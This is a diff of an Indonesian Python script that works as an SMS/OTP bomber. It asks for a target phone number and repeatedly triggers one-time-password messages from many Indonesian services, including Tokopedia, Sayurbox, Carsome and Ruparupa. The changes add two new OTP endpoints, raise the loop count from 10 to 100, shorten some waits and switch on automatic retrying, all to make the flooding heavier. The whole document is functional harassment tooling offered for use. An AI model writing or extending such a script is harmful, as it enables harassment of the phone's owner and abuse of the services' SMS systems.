@@ -35,7 +35,7 @@ def autoketik(s):
         time.sleep(0.050)
 
 def countdown(time_sec):
-    while time_sec:
+    while time_sec > 0:
         mins, secs = divmod(time_sec, 60)
         timeformat = f'\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{mins:02d}:{secs:02d}'
         waktu = time.localtime()
@@ -61,6 +61,7 @@ def countdown(time_sec):
         print(f"{timeformat} | {putih}{hari}, {keterangan_tanggal} {bulan} {keterangan_tahun} | {putih}Waktu {keterangan_jam}", end='\r')
         time.sleep(1)
         time_sec -= 1
+    print("")
 
 def tanya(nomor):
     while True:
@@ -76,7 +77,7 @@ def tanya(nomor):
 
 def jam(nomor):
     print("""
-\033[92m
+\033[1;93m
 
 ▒▒▒▒▒
 ▒ T ▒
@@ -86,16 +87,15 @@ def jam(nomor):
 ▒ U ▒      
 ▒ T ▒            
 ▒   ▒
-▒▒▒▒▒
-
-\033[0m
+▒▒▒▒▒ 2019
+\033[1;93m
 """)
     autoketik("Program Berjalan!")
     b = nomor[1:12] # Contoh nomor = 081319196666
     c = "62" + b    # Contoh nomor = 6281319196666
-    rto = False 
+    rto = True 
 
-    for _ in range(10):
+    for _ in range(100):
         try:
             # 1
             response_tokopedia = requests.get(
@@ -340,12 +340,22 @@ def jam(nomor):
                 })
             )
 
+            # 9
+            response_metroindonesia = requests.post(
+                'http://access.metroindonesia.com/Member/sendpin', data={'phoneno': nomor}
+            )
+
+            # 10
+            response_harnic = requests.post(
+                'https://harnic.id:443/login/phone_auth_OTP', data={'phone': nomor}
+            )
+
 
             if response_tokopedia.status_code == 200:
                 autoketik(f"{putih}Sukses Mengirim OTP Tokopedia!")
-                countdown(120)
+                countdown(5)
                 #time.sleep(60)
-                rto = False
+                rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Tokopedia. Status code: {response_tokopedia.status_code}")
 
@@ -353,7 +363,7 @@ def jam(nomor):
                 autoketik(f"{putih}Sukses Mengirim OTP Mister Aladin!")
                 countdown(100) 
                 #time.sleep(60)
-                rto = False
+                rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Mister Aladin. Status code: {response_misteraladin.status_code}")
 
@@ -361,7 +371,7 @@ def jam(nomor):
                     autoketik(f"{putih}Sukses Mengirim OTP Kredito!")
                     countdown(100)
                     #time.sleep(60)
-                    rto = False
+                    rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Kredito. Status code: {response_kredito.status_code}")
             
@@ -369,7 +379,7 @@ def jam(nomor):
                 autoketik(f"{putih}Sukses Mengirim OTP dari Maucash!")
                 countdown(100)
                 #time.sleep(60)
-                rto = False
+                rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Maucash. Status code: {response_maucash.status_code}")
 
@@ -377,7 +387,7 @@ def jam(nomor):
                 autoketik(f"{putih}Sukses Mengirim OTP Tokko!")
                 countdown(100)
                 #time.sleep(60)
-                rto = False
+                rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Tokko. Status code: {response_tokko.status_code}")
 
@@ -385,7 +395,7 @@ def jam(nomor):
                 autoketik(f"{putih}Sukses Mengirim OTP Sayurbox!")
                 countdown(100)
                 #time.sleep(60)
-                rto = False
+                rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Sayurbox. Status code: {response_sayurbox.status_code}")
 
@@ -393,7 +403,7 @@ def jam(nomor):
                 autoketik(f"{putih}Sukses Mengirim OTP Carsome!")
                 countdown(100)
                 #time.sleep(60)
-                rto = False
+                rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Carsome. Status code: {response_carsome.status_code}")
             
@@ -401,37 +411,52 @@ def jam(nomor):
                 autoketik(f"{putih}Sukses Mengirim OTP Rupa-rupa!")
                 countdown(100)
                 #time.sleep(60)
-                rto = False
+                rto = True
             else:
                 autoketik(f"{merah}Gagal mengirim OTP Rupa-rupa. Status code: {response_ruparupa.status_code}")
+
+            if response_metroindonesia.status_code == 200:
+                autoketik(f"{putih}Sukses Mengirim OTP Metro Indonesia!")
+                countdown(120)
+                rto = True
+            else:
+                autoketik(f"{merah}Gagal mengirim OTP Metro Indonesia. Status code: {response_metroindonesia.status_code}")
+
+            if response_harnic.status_code == 200:
+                autoketik(f"{putih}Sukses Mengirim OTP Hernic!")
+                countdown(120)
+                rto = True
+            else:
+                autoketik(f"{merah}Gagal mengirim OTO Hernic. Status code: {response_harnic.status_code}")
             
         except requests.exceptions.ConnectionError:
             autoketik(f"{merah}Gagal membuat koneksi baru!")
             time.sleep(500) 
-            rto = False
+            rto = True
 
         except urllib3.exceptions.NewConnectionError:
             autoketik(f"{merah}Gagal membuat koneksi baru!")
             time.sleep(500) 
-            rto = False
+            rto = True
         
         except TimeoutError:
             autoketik(f"{merah} Upaya Koneksi Gagal!")
             time.sleep(500) 
-            rto = False
+            rto = True
 
         except urllib3.exceptions.ProtocolError:
             autoketik(f"{merah} Upaya Koneksi Gagal!")
             time.sleep(500) 
-            rto = False
+            rto = True
         
         except KeyboardInterrupt:
             tanya(nomor)
+            rto = True
 
-    """ if rto:
+    if rto:
      autoketik(f"{merah}Mencoba kembali....")
      time.sleep(20)  
-     """
+    
     if not rto:
         tanya(nomor)
 
@@ -439,14 +464,14 @@ def start(nomor, mode):
     try:
         os.system("cls") if os.name == "nt" else os.system("clear")
         if mode == 0:
-            autoketik(f"{putih}Nomor Target {putih}: {hijau}{nomor}{putih}")
+            autoketik(f"{putih}Nomor Target {putih}: {kuning}{nomor}{kuning}")
         jam(nomor)
     except KeyboardInterrupt:
         tanya(nomor)
 
 def tobrut():
     os.system("cls") if os.name == "nt" else os.system("clear")
-    autoketik(f"{putih}Contoh Penulisan Nomor: {hijau}08123123123 / 628123123123{putih}")
+    autoketik(f"{putih}Contoh Penulisan Nomor: {kuning}08123123123 / 628123123123{putih}")
     nomor = input(f"{putih}Masukkan Nomor Tujuan {putih}: {hijau}")
     start(nomor, 0)
 
